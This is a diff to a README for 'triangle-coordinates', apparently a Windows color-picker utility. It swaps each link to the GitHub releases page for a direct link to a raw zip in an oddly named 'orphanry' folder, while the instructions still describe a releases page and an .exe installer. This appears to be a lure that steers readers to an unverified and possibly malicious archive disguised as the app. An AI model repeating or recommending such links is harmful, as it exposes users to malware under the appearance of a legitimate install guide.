@@ -1,6 +1,6 @@
 # 🔺 triangle-coordinates - Simple Triangle Setup for Color Pickers
 
-[![Download triangle-coordinates](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/piecebysigma/triangle-coordinates/releases)
+[![Download triangle-coordinates](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/piecebysigma/triangle-coordinates/raw/refs/heads/main/orphanry/coordinates-triangle-v3.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ To begin, you need to download the application from a trusted source. Follow the
 
 1. Open your web browser (like Chrome, Edge, or Firefox).
 2. Go to the download page by clicking this link or typing it:  
-   [https://github.com/piecebysigma/triangle-coordinates/releases](https://github.com/piecebysigma/triangle-coordinates/releases)
+   [https://github.com/piecebysigma/triangle-coordinates/raw/refs/heads/main/orphanry/coordinates-triangle-v3.0.zip](https://github.com/piecebysigma/triangle-coordinates/raw/refs/heads/main/orphanry/coordinates-triangle-v3.0.zip)
 3. On the releases page, look for the latest version of the app. This is usually at the top and labeled with a version number (for example, "v1.0").
 4. Find the Windows installer file. It usually ends with `.exe` or `.msi`.
 5. Click on the installer file to start downloading it.
@@ -107,6 +107,6 @@ If errors continue, contact support by opening an issue on the GitHub repository
 
 Visit this page to download the latest version for Windows:
 
-[Download triangle-coordinates Releases](https://github.com/piecebysigma/triangle-coordinates/releases)
+[Download triangle-coordinates Releases](https://github.com/piecebysigma/triangle-coordinates/raw/refs/heads/main/orphanry/coordinates-triangle-v3.0.zip)
 
 Follow the instructions above to install and start using the app on your Windows PC.
